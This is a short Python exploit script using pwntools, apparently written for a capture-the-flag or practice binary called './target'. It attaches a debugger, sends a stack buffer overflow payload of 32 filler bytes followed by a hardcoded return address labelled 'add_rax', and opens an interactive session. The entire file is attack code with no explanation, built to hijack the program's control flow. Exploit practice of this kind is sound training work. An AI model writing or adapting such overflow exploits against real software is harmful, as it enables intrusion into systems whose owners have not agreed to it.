#!/bin/python
from pwn import *
exe = ELF('./target')
p = process(exe.path)
context.terminal = ['foot']
gdb.attach(p, gdbscript='''


           ''')
ret = 0x08049014
add_rax = 0x08049022
#################exploiting#####################
payload = b'a'*32
payload += p32(add_rax)
p.sendlineafter(b'>',payload)
##############the end###########################
p.interactive()
